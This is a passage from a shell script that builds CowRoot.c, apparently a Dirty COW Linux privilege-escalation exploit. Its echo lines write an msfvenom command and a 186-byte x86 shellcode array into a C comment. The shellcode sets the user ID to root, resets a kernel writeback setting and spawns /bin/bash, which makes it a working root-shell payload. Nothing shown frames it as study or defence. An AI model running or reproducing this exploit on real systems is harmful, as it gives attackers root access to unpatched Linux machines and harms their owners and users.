...
echo "" >> CowRoot.c 
echo "/*" >> CowRoot.c 
echo "* msfvenom -p linux/x86/exec CMD=\"echo '0' > /proc/sys/vm/dirty_writeback_centisecs;/bin/bash\" PrependSetuid=True -f elf | xxd -i" >> CowRoot.c 
echo "unsigned char sc[] = {" >> CowRoot.c 
echo "  0x7f, 0x45, 0x4c, 0x46, 0x01, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00," >> CowRoot.c 
echo "  0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x03, 0x00, 0x01, 0x00, 0x00, 0x00," >> CowRoot.c 
echo "  0x54, 0x80, 0x04, 0x08, 0x34, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00," >> CowRoot.c 
echo "  0x00, 0x00, 0x00, 0x00, 0x34, 0x00, 0x20, 0x00, 0x01, 0x00, 0x00, 0x00," >> CowRoot.c 
echo "  0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00," >> CowRoot.c 
echo "  0x00, 0x80, 0x04, 0x08, 0x00, 0x80, 0x04, 0x08, 0xba, 0x00, 0x00, 0x00," >> CowRoot.c 
echo "  0x20, 0x01, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00," >> CowRoot.c 
echo "  0x31, 0xdb, 0x6a, 0x17, 0x58, 0xcd, 0x80, 0x6a, 0x0b, 0x58, 0x99, 0x52," >> CowRoot.c 
echo "  0x66, 0x68, 0x2d, 0x63, 0x89, 0xe7, 0x68, 0x2f, 0x73, 0x68, 0x00, 0x68," >> CowRoot.c 
echo "  0x2f, 0x62, 0x69, 0x6e, 0x89, 0xe3, 0x52, 0xe8, 0x3c, 0x00, 0x00, 0x00," >> CowRoot.c 
echo "  0x65, 0x63, 0x68, 0x6f, 0x20, 0x27, 0x30, 0x27, 0x20, 0x3e, 0x20, 0x2f," >> CowRoot.c 
echo "  0x70, 0x72, 0x6f, 0x63, 0x2f, 0x73, 0x79, 0x73, 0x2f, 0x76, 0x6d, 0x2f," >> CowRoot.c 
echo "  0x64, 0x69, 0x72, 0x74, 0x79, 0x5f, 0x77, 0x72, 0x69, 0x74, 0x65, 0x62," >> CowRoot.c 
echo "  0x61, 0x63, 0x6b, 0x5f, 0x63, 0x65, 0x6e, 0x74, 0x69, 0x73, 0x65, 0x63," >> CowRoot.c 
echo "  0x73, 0x3b, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x62, 0x61, 0x73, 0x68, 0x00," >> CowRoot.c 
echo "  0x57, 0x53, 0x89, 0xe1, 0xcd, 0x80" >> CowRoot.c 
echo "};" >> CowRoot.c 
echo "unsigned int sc_len = 186;" >> CowRoot.c 
echo "*/" >> CowRoot.c 
echo "" >> CowRoot.c 
